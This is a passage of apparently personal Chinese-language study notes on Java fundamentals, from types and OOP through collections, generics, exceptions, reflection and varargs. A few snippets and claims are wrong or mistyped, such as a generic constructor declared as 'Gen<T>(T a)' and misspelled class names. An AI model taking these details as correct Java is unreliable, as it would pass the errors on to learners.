编译的一些过程</strong></h3><p>.java 文件经过 javac.exe 编译以后形成字节码文件 .class, 然后由解释执行器 java.exe  将字节码文件加载到java 虚拟机中并执行（Java 虚拟机就是形成的自己的运行平台目的是屏蔽不同操作系统的差异）</p><h2 id="三、Java-基本数据类型"><a href="#三、Java-基本数据类型" class="headerlink" title="三、Java 基本数据类型"></a><strong>三、Java 基本数据类型</strong></h2><h3 id="1-java-的基本数据类型和c-、c-是一样的"><a href="#1-java-的基本数据类型和c-、c-是一样的" class="headerlink" title="1.java 的基本数据类型和c 、c++ 是一样的"></a><strong>1.java 的基本数据类型和c 、c++ 是一样的</strong></h3><p>常见的有</p><p>整数：byte short in long(字节分别是 1,2,4,8)<br>浮点数: float double<br>布尔: boolean<br>字符：char (单个字符的类型，如果是多个字符在java中是一个类 String ，属于符合数据类型)</p><p><strong>注意：</strong></p><p>char 类型和整数进行加减运算的时候，我们直接将 char 类型看成是一个整形，运算结果再转化成字符型</p><h3 id="2-基本数据类型的转换"><a href="#2-基本数据类型的转换" class="headerlink" title="2.基本数据类型的转换"></a><strong>2.基本数据类型的转换</strong></h3><p>(1)数据类型能自动的从低精度向高精度转化，但是不能从高精度向低精度转化<br>(2)小数在java 中默认是double 类型的，于是我们直接写 float a &#x3D; 3.4; 是会报错的，这样就是高精度向低精度了，我们应该 float a &#x3D; 3.4f;<br>(3)高精度向低精度要强制类型转化  int a &#x3D; (int)3.4;<br>(4)java 中不同精度的数据进行运算的时候会自动从低精度转化成高精度 3+4.4 得到的是 double<br>(5)Java 从控制台接受的输入最后都是 String 类型，我们需要对其进行转换，通过 Float.parseFloat(a1)</p><p><strong>补充一个：Java 的输入输出</strong><br>import java.io.*<br>InputStreamReader isr &#x3D; new ImputStreamReader(System.in);<br>BufferedReader br &#x3D; new BufferedReader(isr);<br>System.out.println(“请输入：”);<br>String a1 &#x3D; br.readLine();</p><h2 id="四、Java-运算符"><a href="#四、Java-运算符" class="headerlink" title="四、Java 运算符"></a><strong>四、Java 运算符</strong></h2><p>由于和 C 语言的运算符保持一致，于是我这里不再重复介绍,</p><p><strong>注意：</strong><br>switch 后面条件表达式的数据类型应该和 case 后面的保持一致</p><h2 id="五、Java-如何去构造一个类"><a href="#五、Java-如何去构造一个类" class="headerlink" title="五、Java 如何去构造一个类"></a><strong>五、Java 如何去构造一个类</strong></h2><h3 id="1-一个完整的类是什么样子的"><a href="#1-一个完整的类是什么样子的" class="headerlink" title="1.一个完整的类是什么样子的"></a><strong>1.一个完整的类是什么样子的</strong></h3><pre><code class="hljs">package 包名；class 类名 extends 父类 implements 接口名&#123;    成员变量；    构造方法；    成员方法；&#125;</code></pre><h3 id="2-如何去实例化一个类对象"><a href="#2-如何去实例化一个类对象" class="headerlink" title="2.如何去实例化一个类对象"></a><strong>2.如何去实例化一个类对象</strong></h3><pre><code class="hljs">类名 对象名 = new 类名();</code></pre><h3 id="3-可以把一个类赋值给另一个类"><a href="#3-可以把一个类赋值给另一个类" class="headerlink" title="3.可以把一个类赋值给另一个类"></a><strong>3.可以把一个类赋值给另一个类</strong></h3><p>一个类会根据它内部的属性和方法来分配一定的空间，实例化只是用数值填充这个空间，然后用变量去指向，赋值只不过是用另一个变量也指向那块空间而已</p><h3 id="4-如何创建并调用一个类方法"><a href="#4-如何创建并调用一个类方法" class="headerlink" title="4.如何创建并调用一个类方法"></a><strong>4.如何创建并调用一个类方法</strong></h3><pre><code class="hljs">访问控制修饰符 返回类型 方法名(参数)&#123;    内容；&#125;</code></pre><p>调用方法的时候 Java 使用的是 对象.(点号)方法名(参数)的方法来调用的</p><blockquote><p><strong>注意：</strong></p><p>1.当我们定义了同样名称的带参数的方法和不带参数的方法以后，我们在调用的时候不带参数 Java 虚拟机也能自动的找到我们不带参数的那个方法<br>2.但是如果我们只是单纯的返回类型不一样的话，java 虚拟机就很难区分了</p></blockquote><h3 id="5-如何创建一个类的构造方法"><a href="#5-如何创建一个类的构造方法" class="headerlink" title="5.如何创建一个类的构造方法"></a><strong>5.如何创建一个类的构造方法</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">class Person&#123;int age;String name;public Person(int age,String name)&#123;this.age = age;this.name = name;&#125;public Person(int age)&#123;this.age = age;&#125;&#125;</code></pre><blockquote><p><strong>注意：</strong><br>1.构造方法名称必学和类名相同<br>2.构造方法可以有多个（参数不同），到时候初始化或根据你传入的参数调用不同的构造方法<br>3.当一个类没有自定义构造方法的时候就会在初始化的时候自动，创建一个空的构造方法，如果定义了，那个原始的就会被覆盖<br>4.构造方法没有返回值</p></blockquote><h3 id="6-创建一个类变量"><a href="#6-创建一个类变量" class="headerlink" title="6.创建一个类变量"></a><strong>6.创建一个类变量</strong></h3><p>我们有时候需要让每一个类对象都能共享某一个变量，这个时候类变量就应运而生</p><p><strong>定义方法：</strong></p><p>访问控制修饰符 static 变量名 &#x3D; 值；</p><p><strong>访问方式：</strong></p><p>类名.类变量&#x2F;对象名.类变量</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Child&#123;int age;String name;static int totle=0; // 这个就是一个类变量，可以被各种的类对象共用public Child(int age,String name)&#123;this.age = age;this.name = name;&#125;public void  jionGame()&#123;totle++;System.out.println(&quot;加入&quot;);&#125;&#125;</code></pre><h3 id="7-创建一个类方法"><a href="#7-创建一个类方法" class="headerlink" title="7.创建一个类方法"></a><strong>7.创建一个类方法</strong></h3><p><strong>1.为什么需要类方法：</strong></p><p>有些时候我们不希望这个类的每一个对象都能访问某个属于类的静态变量（并且这样做的确是很浪费空间的）</p><p><strong>2.类方法是属于所有对象实例的，他的创建方法如下：</strong></p><pre><code class="hljs">访问控制修饰符 static  返回类型  方法名()&#123;&#125;</code></pre><blockquote><p><strong>注意：</strong></p><p>1.类方法中只能访问静态变量</p></blockquote><p><strong>3.使用方法：</strong></p><p>类名.类方法名  &#x2F;  对象名.类方法名</p><h2 id="五、Java-面向对象编程"><a href="#五、Java-面向对象编程" class="headerlink" title="五、Java 面向对象编程"></a><strong>五、Java 面向对象编程</strong></h2><h3 id="1-面向对象编程有四大特征："><a href="#1-面向对象编程有四大特征：" class="headerlink" title="1.面向对象编程有四大特征："></a><strong>1.面向对象编程有四大特征：</strong></h3><h4 id="1-抽象："><a href="#1-抽象：" class="headerlink" title="1.抽象："></a><strong>1.抽象：</strong></h4><p>抽象就是将事物共有的特征提取出来形成一个类的方法</p><h4 id="2-封装："><a href="#2-封装：" class="headerlink" title="2.封装："></a><strong>2.封装：</strong></h4><p>将抽象出来的数据和对数据的操作封装到一起，我们只希望通过我们封装的方法(提供给外界的接口对数据进行操作)，这就引出了</p><p><strong>访问控制修饰符：</strong></p><p>(1)public:对外公开<br>(2)protected：对子类以及同一个包中的类公开<br>(3)默认为空：仅仅向同一个包中的类公开<br>(4)private ：只有类本身能访问，不对外公开</p><p><strong>包：</strong></p><p><strong>包的作用：</strong></p><p>1.避免类名的冲突（不同的包中能定义相同的类名，不会打架）<br>2.很好的管理类<br>3.控制访问范围</p><p><strong>打包命令：</strong></p><pre><code class="hljs">package com.xxx</code></pre><p>文件开头有了这句话的时候，这个文件生成的字节码就能放在对应的包里</p><p><strong>包的命名：</strong></p><p>小写字母 用点号分割</p><p><strong>包的引入：</strong></p><p>import 包名</p><p>目的是引用包中的类</p><h4 id="3-继承："><a href="#3-继承：" class="headerlink" title="3.继承："></a><strong>3.继承：</strong></h4><p>继承为了解决代码复用的问题，子类继承了父类以后就拥有了父类的属性和方法</p><pre><code class="hljs">子类 extends 父类</code></pre><p><strong>注意：</strong></p><pre><code class="hljs">1.父类的 private 是不能被继承的2.子类最多继承一个父类</code></pre><h4 id="4-多态："><a href="#4-多态：" class="headerlink" title="4.多态："></a><strong>4.多态：</strong></h4><p>我们先来说说重载，和覆盖的概念</p><p><strong>什么是重载？</strong></p><p>重载就是为了实现一个目的就是使用相同的名字去调用不同的方法(当然方法的参数类型什么的不一样)，实际上就是做到了访问方式的统一</p><p><strong>注意：</strong></p><p>(1)方法名相同<br>(2)参数类型、个数、顺序至少一项不同<br>(3)方法的返回类型可以不同<br>(4)方法的修饰符可以不同</p><p><strong>什么是覆盖？</strong></p><p>其实就是子类对父类的方法的重写</p><blockquote><p><strong>注意：</strong></p><p>1.子类的这个方法要和父类的名称、返回类型、参数一致<br>2.子类方法不能缩小父类方法的访问权限</p></blockquote><p>我们现在来介绍多态：</p><p>多态就是子类继承了父类以后，我们可以通过 将子类的实例化对象赋值给父类的方式实例化子类对象</p><p><strong>示例代码：</strong></p><pre><code class="hljs">public class Demo&#123;    public static void main(String[] args)&#123;        Animal an = new Cat();        an.cry();        Animal bn = new Dog();        bn.cry();    &#125;&#125;public class Animal&#123;    public void cry（)&#123;        System.out.println(&quot;动物叫&quot;)；        &#125;&#125;public class Cat extends Animal&#123;    public void cry（)&#123;        System.out.println(&quot;猫叫&quot;)；        &#125;&#125;public class Dog extends Animal&#123;    public void cry（)&#123;        System.out.println(&quot;狗叫&quot;)；        &#125;&#125;</code></pre><p>我们清楚地看见，我们将子类的对象赋值给父类变量，并且一样能调用</p><p><strong>那么这种机制有什么用？</strong></p><p>我们其实希望在传参的时候保持一致，形参都是父类，这样就非常好的，举一个例子</p><p><strong>示例代码：</strong></p><pre><code class="hljs">public class Demo &#123;    public static void main(String args[])&#123;        Master master = new Master();        master.feed(new Dog(),new Bone());        master.feed(new Cat(),new Fish());    &#125;&#125;class Animal &#123;    String name;    public void cry()&#123;        System.out.println(&quot;不知道怎么叫&quot;);    &#125;    public void eat()&#123;        System.out.println(&quot;不知道吃什么&quot;);    &#125;&#125;class Dog extends Animal&#123;    public void cry()&#123;        System.out.println(&quot;汪汪叫&quot;);    &#125;    public void eat()&#123;        System.out.println(&quot;吃骨头&quot;);    &#125;&#125;class Cat extends Animal&#123;    public void cry()&#123;        System.out.println(&quot;喵喵叫&quot;);    &#125;    public void eat()&#123;        System.out.println(&quot;吃鱼&quot;);    &#125;&#125;class Food &#123;    String name;    public void getname()&#123;        System.out.println(&quot;不知道是什么&quot;);    &#125;&#125;class Bone extends Food &#123;    public void getname()&#123;        System.out.println(&quot;骨头&quot;);    &#125;&#125;class Fish extends Food &#123;    public void getname()&#123;        System.out.println(&quot;鱼&quot;);    &#125;&#125;class Master&#123;    public void feed(Animal an,Food fd)&#123;//注意看这个方法        an.cry();        fd.getname();    &#125;&#125;</code></pre><p>我们看到 Master 在传递参数时的形参是 Animal 这个父类，但是实参是 Cat 或者 Dog 的子类</p><h3 id="2-抽象类和接口："><a href="#2-抽象类和接口：" class="headerlink" title="2.抽象类和接口："></a><strong>2.抽象类和接口：</strong></h3><h4 id="1-抽象类："><a href="#1-抽象类：" class="headerlink" title="1.抽象类："></a><strong>1.抽象类：</strong></h4><p>为什么需要抽象类、</p><p>当父类的某方法不能确定的时候，我们就将其定义为一个抽象类，使用 abstruct 修饰符修饰</p><blockquote><p><strong>注意：</strong></p><p>1.当某一个类中有抽象方法的时候这个类也就是一个抽象类，必须要在前面加上 abstruct修饰符<br>2.抽象类吃的子类必须将父类的所有抽象方法全部实现<br>3.抽象类是不用实现里面的抽象方法的，只用定义，让子类去实现好了<br>4.抽象类不能被实例化<br>5.抽象类不一定要包含抽象方法，但是包含抽象方法的类一定是抽象类</p></blockquote><h4 id="2-接口："><a href="#2-接口：" class="headerlink" title="2.接口："></a><strong>2.接口：</strong></h4><p>接口就是给出一些没有内容的方法，封装到一起，到某个类要使用的时候再根据具体情况将这些方法写出来</p><p><strong>格式:</strong></p><pre><code class="hljs">class 类名 implements 接口名&#123;    变量；    方法;&#125;</code></pre><p><strong>注意：</strong></p><p>1.当一个类实现了一个接口就要把这个接口的全部方法实现<br>2.接口不能被实例化<br>3.接口中的所有方法都不能有主体<br>4.一个类能实现多个接口<br>5.接口中的变量不能加任何的修饰符（默认就是 static 的），于是在开发中常常将比较常用的变脸放在接口中作为全局变量使用，访问形式：</p><pre><code class="hljs">接口名.变量名</code></pre><p>6.一个接口不能继承其他的类但是能继承其他接口<br>7.接口是对java 单继承的一种弥补，</p><h3 id="3-final："><a href="#3-final：" class="headerlink" title="3.final："></a><strong>3.final：</strong></h3><p>final 能用来修饰变量或者方法</p><p><strong>使用条件：</strong></p><p>(1)当父类的某个方法不希望被子类覆盖的时候就可以使用 final 来修饰<br>(2)当不希望某个类的变量的值被修改就可以使用 final 修饰，但是这种情况必须赋初值<br>(3)当不希望类被继承的时候可以使用final 来修饰</p><h2 id="六、Java-数组"><a href="#六、Java-数组" class="headerlink" title="六、Java 数组"></a><strong>六、Java 数组</strong></h2><h3 id="1-先介绍一下Java的位运算符"><a href="#1-先介绍一下Java的位运算符" class="headerlink" title="1.先介绍一下Java的位运算符"></a><strong>1.先介绍一下Java的位运算符</strong></h3><p>按位与：&amp;<br>按位或：|<br>按位亦或：^<br>按位取反: ~</p><h3 id="2-一维数组："><a href="#2-一维数组：" class="headerlink" title="2.一维数组："></a><strong>2.一维数组：</strong></h3><p><strong>形式：</strong></p><pre><code class="hljs">数据类型  数组名[] = new 数据类型[元素个数]；</code></pre><p><strong>注意：</strong></p><p>1.除了有普通类型的数组以外，还能有对象数组（反正是一个类型）<br>2.对象数组在定义以后，赋值时必须再次为每个对象分配空间</p><h3 id="3-二维数组："><a href="#3-二维数组：" class="headerlink" title="3.二维数组："></a><strong>3.二维数组：</strong></h3><p>形式 ：</p><p>数据类型 数组名 [][] &#x3D; new 数据类型 [大小][大小]</p><h2 id="七、Java-集合类"><a href="#七、Java-集合类" class="headerlink" title="七、Java 集合类"></a><strong>七、Java 集合类</strong></h2><h3 id="1-为什么需要集合类"><a href="#1-为什么需要集合类" class="headerlink" title="1.为什么需要集合类"></a><strong>1.为什么需要集合类</strong></h3><p>我们知道数组的长度是不能动态改变的，但是集合类可以做到</p><h3 id="2-Java-的集合类："><a href="#2-Java-的集合类：" class="headerlink" title="2.Java 的集合类："></a><strong>2.Java 的集合类：</strong></h3><h4 id="1-List-结构的集合类："><a href="#1-List-结构的集合类：" class="headerlink" title="(1)List 结构的集合类："></a><strong>(1)List 结构的集合类：</strong></h4><pre><code class="hljs">ArrayList LinkList Vector  Stack</code></pre><p><strong>区别：</strong></p><p>1.ArrayList 是异步的 Vector 是同步的<br>2.数据增长ist方面，ArrayList 在空间不够的时候会自增长 50%  Vector 会增长 100%</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package jihe;import java.util.*;public class test3 &#123;    public static void main(String args[])&#123;        ArrayList al = new ArrayList();//创建一个集合        Clerk clerk1 = new Clerk(10,&quot;zhangfei&quot;,1000);        al.add(clerk1);//向集合中添加元素        System.out.println(al.size());        Clerk temp = (Clerk) al.get(0);//取出集合中的元素        temp.getname();        al.remove(0);//删除集合中的元素    &#125;&#125;class Clerk &#123;    private int age;    private String name;    private float sal;    public Clerk(int age,String name,float sal)&#123;        this.age = age;        this.name = name;        this.sal = sal;    &#125;    public void getname()&#123;        System.out.println(this.name);    &#125;&#125;</code></pre><p>再给一个比较常见的应用代码：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import java.util.*;import java.io.*;public class demo3 &#123;    public static void main( String args[]) throws Exception&#123;        EmpManager em = new EmpManager();        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));        //一个简易的菜单        while(true)&#123;            System.out.println(&quot;请选择一个你要进行的操作&quot;);            System.out.println(&quot;1.添加一个雇员&quot;);            System.out.println(&quot;2.显示雇员信息&quot;);            System.out.println(&quot;3.修改雇员薪水&quot;);            System.out.println(&quot;4.删除一个雇员&quot;);            System.out.println(&quot;5.退出系统&quot;);            String operType = br.readLine();            if(operType.equals(&quot;1&quot;))&#123;                System.out.println(&quot;请输入编号：&quot;);                String empNo =  br.readLine();                System.out.println(&quot;请输入名字：&quot;);                String name = br.readLine();                System.out.println(&quot;请输入薪水&quot;);                float sal = Float.parseFloat(br.readLine());                Emp emp = new Emp(empNo,name,sal);                em.addEmp(emp);            &#125;            else if(operType.equals(&quot;2&quot;))&#123;                System.out.println(&quot;请输入编号：&quot;);                String empNo =  br.readLine();                em.showInfo(empNo);            &#125;            else if(operType.equals(&quot;3&quot;))&#123;                System.out.println(&quot;请&quot;);            &#125;            else if(operType.equals(&quot;4&quot;))&#123;            &#125;            else if(operType.equals(&quot;5&quot;))&#123;                System.exit(0);            &#125;        &#125;    &#125;&#125;class EmpManager &#123;    private ArrayList al = null;    public EmpManager()&#123;        this.al = new ArrayList();    &#125;    public void addEmp(Emp emp)&#123;        al.add(emp);    &#125;    public void showInfo(String empNo)&#123;        for(int i=0;i&lt;al.size();i++)&#123;            Emp emp = (Emp)al.get(i);            if(emp.getEmpNo().equals(empNo))&#123;                System.out.println(&quot;该员工的编号是:&quot;+emp.getEmpNo());                System.out.println(&quot;该员工的名字是:&quot;+emp.getName());                System.out.println(&quot;该员工的薪水是:&quot;+emp.getSal());            &#125;        &#125;    &#125;    public void updateSal(String empNo,float newSal)&#123;        for(int i=0;i&lt;al.size();i++)&#123;            Emp emp = (Emp)al.get(i);            if(emp.getEmpNo().equals(empNo))&#123;                emp.setSal(newSal);            &#125;        &#125;    &#125;    public void delEmp(String empNo)&#123;        for(int i=0;i&lt;al.size();i++)&#123;        Emp emp = (Emp)al.get(i);        if(emp.getEmpNo().equals(empNo))&#123;            al.remove(emp);//al.remove(i);        &#125;    &#125;&#125;&#125;class Emp&#123;    private String empNo;    private String name;    private float sal;    public Emp(String empNo, String name, float sal)&#123;        this.empNo = empNo;        this.name = name;        this.sal = sal;    &#125;    public String getEmpNo() &#123;        return empNo;    &#125;    public void setEmpNo(String empNo) &#123;        this.empNo = empNo;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public float getSal() &#123;        return sal;    &#125;    public void setSal(float sal) &#123;        this.sal = sal;    &#125;    &#125;</code></pre><h4 id="2-Map结构的集合类"><a href="#2-Map结构的集合类" class="headerlink" title="(2)Map结构的集合类"></a><strong>(2)Map结构的集合类</strong></h4><pre><code class="hljs">HashMap  HashTable</code></pre><p><strong>区别：</strong></p><p>1.HashMap 是异步的  HashTable 是同步的（线程安全）<br>2.HashMap   接受空值作为 key 或者 value HashTable 不能</p><p>常见用法代码实例</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import java.util.*;public class demo &#123;    public static void main(String args[])&#123;        HashMap hm = new HashMap();        Emp emp1 = new Emp(&quot;S001&quot;,&quot;张三&quot;,12.5f);        Emp emp2 = new Emp(&quot;S002&quot;,&quot;李四&quot;,13.9f);        hm.put(&quot;S001&quot;,emp1);        hm.put(&quot;S002&quot;,emp2);        if(hm.containsKey(&quot;S002&quot;))&#123;            System.out.println(&quot;有该员工&quot;);            Emp emp = (Emp)hm.get(&quot;S002&quot;);            System.out.println(&quot;该员工的名字是：&quot;+emp.getName());        &#125;        else&#123;            System.out.println(&quot;没有该员工&quot;);        &#125;        Iterator it = hm.keySet().iterator();//迭代key         while(it.hasNext())&#123;            String key = it.next().toString();//因为返回来是一个对象，所以我们需要 toString()            Emp emp = (Emp)hm.get(key);            System.out.println(emp.getName());            System.out.println(emp.getEmpNo());            System.out.println(emp.getSal());        &#125;    &#125;&#125;class Emp&#123;    private String empNo;    private String name;    private float sal;    public Emp(String empNo, String name, float sal)&#123;        this.empNo = empNo;        this.name = name;        this.sal = sal;    &#125;    public String getEmpNo() &#123;        return empNo;    &#125;    public void setEmpNo(String empNo) &#123;        this.empNo = empNo;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public float getSal() &#123;        return sal;    &#125;    public void setSal(float sal) &#123;        this.sal = sal;    &#125;&#125;</code></pre><h4 id="3-set-结构的集合类"><a href="#3-set-结构的集合类" class="headerlink" title="(3)set 结构的集合类"></a><strong>(3)set 结构的集合类</strong></h4><pre><code class="hljs">HashSet  TreeSet</code></pre><h4 id="4-Queue-结构的集合类"><a href="#4-Queue-结构的集合类" class="headerlink" title="(4)Queue 结构的集合类"></a><strong>(4)Queue 结构的集合类</strong></h4><pre><code class="hljs">Queue 接口</code></pre><h2 id="八、Java-泛型"><a href="#八、Java-泛型" class="headerlink" title="八、Java 泛型"></a><strong>八、Java 泛型</strong></h2><h3 id="1-定义："><a href="#1-定义：" class="headerlink" title="1.定义："></a><strong>1.定义：</strong></h3><p>泛型的本质是参数化类型，就是将所操作的数据类型指定成一个参数，这中参数化类型可以用在 类、接口和方法的创建中，分别称为泛型类、泛型接口和泛型方法</p><h3 id="2-为什么要用泛型"><a href="#2-为什么要用泛型" class="headerlink" title="2.为什么要用泛型"></a><strong>2.为什么要用泛型</strong></h3><p>没有泛型的情况下，通过对类型 Object 的引用实现参数类型的“任意化”，但是这样就必须要强制类型转化，也就是说开发者要预先知道参数的类型，这是很困难的，容易造成类型转化错误。</p><h3 id="3-泛型的优点"><a href="#3-泛型的优点" class="headerlink" title="3.泛型的优点"></a><strong>3.泛型的优点</strong></h3><p>(1)类型安全<br>(2)向后兼容<br>(3)层次清晰<br>(4)效率较高</p><p><strong>示例代码：</strong></p><pre><code class="hljs">public class Demo &#123;    public static void main(String args[])&#123;      Gen&lt;String&gt; gen1 = new Gen&lt;String&gt;(&quot;aaa&quot;);      gen1.showTypeName();    &#125;&#125;class Gen&lt;T&gt;&#123;    private T o;    public Gen&lt;T&gt;(T a)&#123;        o = a;    &#125;    public void showTypeName()&#123;        System.out.println(&quot;类型是：&quot;+o.getClass().getName());    &#125;&#125;</code></pre><h2 id="九、Java-异常"><a href="#九、Java-异常" class="headerlink" title="九、Java 异常"></a><strong>九、Java 异常</strong></h2><h3 id="1-Java-用两种方法处理异常"><a href="#1-Java-用两种方法处理异常" class="headerlink" title="1.Java 用两种方法处理异常"></a><strong>1.Java 用两种方法处理异常</strong></h3><p>1.在发生异常的地方直接处理<br>2.将异常抛给调用者，让调用者处理</p><h3 id="2-异常的分类"><a href="#2-异常的分类" class="headerlink" title="2.异常的分类"></a><strong>2.异常的分类</strong></h3><p><strong>1.检查性异常：</strong></p><p>程序本身没有问题，外在环境的问题导致程序不能正常编译，比如打开一个不存在的 socket 端口</p><p><strong>2.运行期异常</strong></p><p>说明程序本身有Bug</p><h3 id="3-异常的处理"><a href="#3-异常的处理" class="headerlink" title="3.异常的处理"></a><strong>3.异常的处理</strong></h3><h4 id="1-try-catch"><a href="#1-try-catch" class="headerlink" title="1. try catch"></a><strong>1. try catch</strong></h4><pre><code class="hljs">try&#123;    可能存在异常的语句；&#125;catch(Exception e)&#123;    e.printStackTrace();&#125;</code></pre><h4 id="2-finally"><a href="#2-finally" class="headerlink" title="2.finally"></a><strong>2.finally</strong></h4><p>finally 属于万能的保险，可以将其放在 catch 之后，这个语句块一定会执行，通常用在文件资源的关闭上</p><p><strong>以下情形 finally 不会被执行：</strong></p><p>(1)finally 块中发生了异常<br>(2)程序所在的线程死亡<br>(3)前面的代码中使用了 System.exit()<br>(4)关闭CPU</p><p><strong>3.throws 将异常抛给调用者</strong></p><p>这个的使用就在方法的后面跟上  throws Exception 就行了，然后再调用函数中得 try  catch 中捕获</p><h2 id="十、java-的反射机制"><a href="#十、java-的反射机制" class="headerlink" title="十、java 的反射机制"></a><strong>十、java 的反射机制</strong></h2><h3 id="1-反射机制中的类："><a href="#1-反射机制中的类：" class="headerlink" title="1.反射机制中的类："></a><strong>1.反射机制中的类：</strong></h3><p>java.lang.Class<br>java.lang.reflect.Constructor<br>java.lang.reflect.Field<br>java.lang.reflect.Methods<br>java.lang.reflect.Modifier</p><p>如果我们把第一个看成一个整体的话，后面的几个就分别是这个类的 构造方法、属性、方法、修饰符</p><h3 id="2-反射机制的作用"><a href="#2-反射机制的作用" class="headerlink" title="2.反射机制的作用"></a><strong>2.反射机制的作用</strong></h3><p>1.反编译： .class -&gt; .java<br>2.通过反射机制访问Java 的属性和方法和构造方法等</p><h3 id="3-获取-Class-的三种方式："><a href="#3-获取-Class-的三种方式：" class="headerlink" title="3.获取 Class 的三种方式："></a><strong>3.获取 Class 的三种方式</strong>：</h3><p><strong>示例代码1：</strong></p><p><strong>reflectTest.java</strong></p><pre><code class="hljs"> package test;//获取class 类型对象的三种方式public class reflectTests &#123;    public static void main(String[] args) throws ClassNotFoundException &#123;        //方法一        Class c1 = Class.forName(&quot;test.Employee&quot;);//这里一定要写全路径 引用保存内存地址指向堆中的对象，该内存地址表示的是整个类        //方法二        //Java 中每个类型都有class 属性        Class c2 = Employee.class;        //方法三        // 任何一个对象都有 getClass 方法        Employee em = new Employee();        Class c3 = em.getClass();        // 双等于号两边如果是引用对象的话，比较的是地址        System.out.println(c1 == c2);        System.out.println(c3 == c2);    &#125;&#125;</code></pre><p><strong>Employee.java</strong></p><pre><code class="hljs">package test;public class Employee &#123;    //Field    private String name;    //Constructor    public Employee()&#123;&#125;    public Employee(String name)&#123;        this.name = name;    &#125;    //Methods    public void work()&#123;        System.out.println(name+&quot;在工作&quot;);    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">truetrue    </code></pre><p><strong>示例代码2：</strong></p><pre><code class="hljs"> Class c4 = int.class;// 这个C4 就代表 int 类型 </code></pre><h4 id="注意-forName-和-xx-getClass-的区别"><a href="#注意-forName-和-xx-getClass-的区别" class="headerlink" title="注意 forName 和 xx.getClass 的区别"></a><strong>注意 forName 和 xx.getClass 的区别</strong></h4><p><strong>forName 示例代码：</strong></p><pre><code class="hljs">package test2;public class test02  &#123;    public static void main(String[] args) throws Exception&#123;        Class.forName(&quot;test2.A&quot;);    &#125;&#125;class A&#123;    static&#123;        System.out.println(&quot;test A&quot;);    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">test A</code></pre><p>可以看到我们的静态块被执行了，说明这个是将 A.class 装载到JVM 的过程中</p><p><strong>A.getClass 示例代码：</strong></p><pre><code class="hljs">package test2;public class test02  &#123;    public static void main(String[] args) throws Exception&#123;        Class c = A.class;    &#125;&#125;class A&#123;    static&#123;        System.out.println(&quot;test A&quot;);    &#125;&#125;</code></pre><p>结果是没有运行</p><h3 id="4-通过Class-类型的对象创建class-对象："><a href="#4-通过Class-类型的对象创建class-对象：" class="headerlink" title="4.通过Class 类型的对象创建class 对象："></a><strong>4.通过Class 类型的对象创建class 对象</strong>：</h3><p><strong>test3.java</strong></p><pre><code class="hljs">package test3;public class test3 &#123;    public static void main(String[] args) throws Exception&#123;        Class c = Class.forName(&quot;test3.Employee&quot;);        Object o = c.newInstance();//调用无参数构造方法        System.out.println(o);    &#125;&#125;</code></pre><p><strong>Employee.java</strong></p><pre><code class="hljs">package test3;public class Employee &#123;    //Field    private String name;    //Constructor    public Employee()&#123;        System.out.println(&quot;构造方法调用成功&quot;);    &#125;    public Employee(String name)&#123;        this.name = name;    &#125;    //Methods    public void work()&#123;        System.out.println(name+&quot;在工作&quot;);    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">构造方法调用成功test3.Employee@4554617c</code></pre><p>可见成功的创建了这个对象，调用了无参数构造方法</p><h3 id="5-可变长参数："><a href="#5-可变长参数：" class="headerlink" title="5.可变长参数："></a><strong>5.可变长参数：</strong></h3><h4 id="1-一般形式："><a href="#1-一般形式：" class="headerlink" title="1.一般形式："></a><strong>1.一般形式：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">package test4;public class changeLen &#123;    public static void ma(int... a)&#123;        System.out.println(&quot;Test&quot;);    &#125;    public static void main(String[] args)&#123;        ma(1);        ma(1,2);        ma(1,2,3);        ma(1,2,3,4,5,6,7,8,9,0);    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">TestTestTestTest</code></pre><h4 id="2-存在精确匹配："><a href="#2-存在精确匹配：" class="headerlink" title="2.存在精确匹配："></a><strong>2.存在精确匹配：</strong></h4><p>当存在精确匹配的时候，会优先调用精确匹配的函数，实例如下：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package test4;public class changeLen &#123;    public static void m1(int... a)&#123;        System.out.println(&quot;Test&quot;);    &#125;    public static void m1(int i)&#123;        System.out.println(i);    &#125;    public static void main(String[] args)&#123;        m1(1);        m1(1,2);        m1(1,2,3);        m1(1,2,3,4,5,6,7,8,9,0);    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1TestTestTest</code></pre><h4 id="3-可变长参数可等同看成数组"><a href="#3-可变长参数可等同看成数组" class="headerlink" title="3.可变长参数可等同看成数组"></a><strong>3.可变长参数可等同看成数组</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">package test4;public class changeLen &#123;    public static void m1(int... a)&#123;        System.out.println(&quot;Test&quot;);    &#125;    public static void m1(int i)&#123;        System.out.println(i);    &#125;    public static void m2(String... args)&#123;        for(int i = 0;i&lt;args.length;i++)&#123;            System.out.println(args[i]);        &#125;    &#125;    public static void main(String[] args)&#123;        m1(1);        m1(1,2);        m1(1,2,3);        m1(1,2,3,4,5,6,7,8,9,0);        m2(&quot;体育&quot;,&quot;音乐&quot;,&quot;美食&quot;,&quot;养生&quot;);    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1TestTestTest体育音乐美食养生</code></pre><blockquote><p><strong>注意：</strong></p><p>同样，在 m2 的参数中可以直接传入一个数组</p></blockquote><p>当然我们就能通过这种方式批量的创建对象了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">  public static void m3(Class... args) throws Exception &#123;        for(int i = 0;i&lt;args.length;i++)&#123;            Class c = args[i];            System.out.println(c.newInstance());        &#125;    &#125;</code></pre><blockquote><p><strong>注意:</strong></p><p>1.可变长参数只能出现一次，且只能出现在参数列表的最后一位</p></blockquote><h3 id="6-IO-和-Properties-的联合应用："><a href="#6-IO-和-Properties-的联合应用：" class="headerlink" title="6.IO 和 Properties 